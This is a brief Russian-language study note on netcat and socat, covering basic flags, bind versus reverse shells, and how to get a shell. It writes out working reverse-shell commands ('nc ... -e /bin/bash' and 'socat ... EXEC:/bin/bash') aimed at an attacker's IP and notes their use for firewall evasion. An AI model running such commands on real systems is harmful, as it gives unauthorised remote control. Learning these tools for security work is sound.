## Netcat и Socat
---
### 1. Netcat (nc)
Универсальная утилита для передачи данных, удаленного подключения и сканирования портов.
- **Основные флаги:**
    - `-l` (Listen): Режим прослушивания.
        
    - `-v` (Verbose): Вывод подробной информации о процессе.
        
    - `-n` (Numeric): Работа только с IP-адресами (без DNS-запросов).
        
    - `-p` (Port): Указание номера порта.
- **Базовые команды:**
    - **Создание слушателя:** `nc -lvnp [port]`
        
    - **Подключение к узлу:** `nc -nv [ip] [port]`
---
### 2. Типы оболочек (Shells)
При работе с удаленным доступом выделяют два основных сценария подключения:
- **Bind Shell:** Хакер напрямую подключается к открытому порту на целевой машине.
    - _Проблема:_ Часто блокируется входящими правилами Firewall.
        
- **Reverse Shell:** Целевая машина сама инициирует соединение с хакером.
    - _Преимущество:_ Firewall обычно разрешает исходящие соединения, что позволяет обойти защиту.
---
### 3. Получение Reverse Shell через Netcat
Для управления системой необходимо связать соединение с командной оболочкой (shell).
1. **На стороне хакера (ожидание):**
```Bash
nc -lvnp 4444
```
2. **На стороне цели (отправка shell):**
```Bash
nc -nv [IP_хакера] 4444 -e /bin/bash
```
*Флаг `-e` выполняет указанный файл (`/bin/bash`) после установки соединения.*

---
### 4. Socat
Более мощный и современный аналог Netcat, поддерживающий передачу данных между практически любыми точками (файлы, сокеты, устройства).
*   **Режим слушателя (Listener):** 
```bash
socat TCP4-LISTEN:[port] STDOUT
```
*   **Обычное подключение:**
```bash
socat TCP4:[ip]:[port]
```
*   **Получение Reverse Shell через Socat:**
```bash
socat TCP4:[ip]:[port] EXEC:/bin/bash
```
